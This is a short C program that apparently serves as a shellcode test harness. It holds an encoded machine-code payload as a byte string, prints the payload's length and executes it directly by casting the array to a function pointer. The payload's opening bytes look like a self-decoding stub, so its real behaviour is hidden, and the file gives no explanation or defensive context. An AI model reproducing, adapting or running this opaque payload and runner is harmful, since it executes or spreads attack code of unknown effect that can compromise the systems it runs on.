#include<stdio.h>
#include<string.h>

unsigned char code[] =  "\xdb\xd5\xba\xa6\x9c\x1b\xf7\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1\x0f\x31\x56\x18\x03\x56\x18\x83\xc6\xa2\x7e\xee\x6e\xc0\x71\x49\xc3\xfc\xaf\x69\xe3\xfc\x80\x01\x8c\x91\xbb\xfe\x22\x1d\x28\x60\xa1\xb0\xd1\x01\x4d\x23\x7c\xa3\xa2\xc0\xec\x4a\xd8\x0b\x99\xe9\x51\x27\x4f\x86\xed\xb3\x8f\x3d\x66\x8d\x91\xc1\x76\xa8\x5c\x41\x1c\x4b\x07\x8f\x61";



main()
{
	printf("Shellcode Length: %d\n",strlen(code));
	int (*ret) () = (int(*)())code;
	ret();
}
